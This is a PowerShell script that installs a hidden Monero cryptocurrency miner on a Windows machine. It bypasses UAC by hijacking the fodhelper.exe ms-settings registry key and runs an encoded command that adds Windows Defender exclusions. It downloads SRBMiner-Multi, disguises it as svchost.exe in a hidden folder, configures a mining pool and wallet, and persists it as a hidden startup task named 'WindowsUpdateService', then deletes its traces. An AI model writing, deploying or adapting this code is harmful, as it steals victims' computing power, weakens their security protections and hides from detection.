function Add-FolderExclusion {
    $folder = "$env:APPDATA\Microsoft\Windows\Crypto"
    $scriptPath = "$env:TEMP\task.ps1"
    $command = "Add-MpPreference -ExclusionPath '$folder' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'svchost.exe' -ErrorAction SilentlyContinue"
    $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
    $encoded = [Convert]::ToBase64String($bytes)
    "powershell.exe -NoP -Ep Bypass -Enc $encoded" | Out-File -FilePath $scriptPath -Encoding ASCII

    $regKey = "HKCU:\Software\Classes\ms-settings\shell\open\command"
    New-Item -Path $regKey -Force | Out-Null
    New-ItemProperty -Path $regKey -Name "DelegateExecute" -Value "" -Force | Out-Null
    Set-ItemProperty -Path $regKey -Name "(default)" -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -Force
    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
    Start-Sleep -Seconds 5
    Remove-Item -Path $regKey -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item $scriptPath -Force -ErrorAction SilentlyContinue
}

function Install-BackgroundService {
    $workDir = "$env:APPDATA\Microsoft\Windows\Crypto"
    New-Item -ItemType Directory -Path $workDir -Force | Out-Null
    attrib +h $workDir

    $sourceUrl = "https://github.com/doktor83/SRBMiner-Multi/releases/download/2.7.5/SRBMiner-Multi-2-7-5-win64.zip"
    $zipPath = "$env:TEMP\package.zip"
    $extractPath = "$env:TEMP\package"

    Invoke-WebRequest -Uri $sourceUrl -OutFile $zipPath -UseBasicParsing
    Expand-Archive -Path $zipPath -DestinationPath $extractPath -Force
    Copy-Item "$extractPath\SRBMiner-Multi-2-7-5\SRBMiner-Multi.exe" -Destination "$workDir\svchost.exe" -Force

    $configData = @"
{
    "cpu": { "enabled": true, "max_threads": 2, "priority": 1 },
    "pools": [ { "pool": "pool.supportxmr.com:3333", "wallet": "44hEzgDamuSMLdWLUVkmJpJvTLeWjjc2LhUqa898N9eaXFm4QqJuTBR5HfKE8j954SReNHhZHW7NW5gdbWdQuVjg8maA4vz", "password": "x", "algorithm": "rx/0" } ],
    "background": true
}
"@
    $configData | Out-File -FilePath "$workDir\config.json" -Encoding ASCII

    $taskAction = New-ScheduledTaskAction -Execute "$workDir\svchost.exe" -Argument "--config $workDir\config.json"
    $taskTrigger = New-ScheduledTaskTrigger -AtStartup
    $taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden
    Register-ScheduledTask -TaskName "WindowsUpdateService" -Action $taskAction -Trigger $taskTrigger -Settings $taskSettings -Force

    Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
    Remove-Item $extractPath -Recurse -Force -ErrorAction SilentlyContinue

    Start-Process -FilePath "$workDir\svchost.exe" -ArgumentList "--config $workDir\config.json" -WindowStyle Hidden
}

Add-FolderExclusion
Install-BackgroundService
